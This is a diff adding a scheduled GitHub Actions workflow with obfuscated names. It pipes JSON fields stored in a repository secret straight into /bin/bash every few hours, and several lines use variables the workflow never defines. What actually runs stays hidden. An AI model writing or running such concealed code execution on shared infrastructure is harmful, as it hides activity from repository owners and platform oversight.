@@ -1,0 +1,25 @@
+name: guoposhanhezaii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guoposhanhezaii
+        env:
+          vlxv4: ${{ secrets.vlxv4 }}
+        run: |
+          echo $vlxv4 | jq -r .m01355 | /bin/bash
+          echo $so3 | jq -r .aqws11 | /bin/bash
+          echo $n2 | jq -r .p16752 | /bin/bash
+          echo $own8 | jq -r .ugge5613 | /bin/bash
+          echo $jkva782 | jq -r .dc217 | /bin/bash
+          echo $ggf3 | jq -r .njv43 | /bin/bash
+          echo $jnf96859 | jq -r .mq3 | /bin/bash
+          echo $tj577 | jq -r .mqga6 | /bin/bash
+          echo $hf0 | jq -r .yqip8 | /bin/bash
+
